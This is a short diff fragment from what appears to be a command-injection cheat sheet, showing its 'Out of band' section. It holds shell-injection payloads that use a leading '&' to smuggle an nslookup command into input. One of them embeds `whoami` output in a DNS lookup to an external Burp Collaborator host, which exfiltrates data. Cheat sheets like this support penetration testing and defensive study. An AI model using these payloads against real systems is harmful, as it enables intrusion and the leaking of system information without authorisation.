@@ -46,7 +46,7 @@ Now, you can read content like this ```/image?filename=output.txt```
 
 ## Out of band
 ```sh
-& nslookup xgvse45vdusd5etw7ewqd9d78wq.burpcollaborator.net #
+& nslookup x.burpcollaborator.net #
 
 & nslookup `whoami`.xgvse45vdusd5etw7ewqd9d78wq.burpcollaborator.net #
 
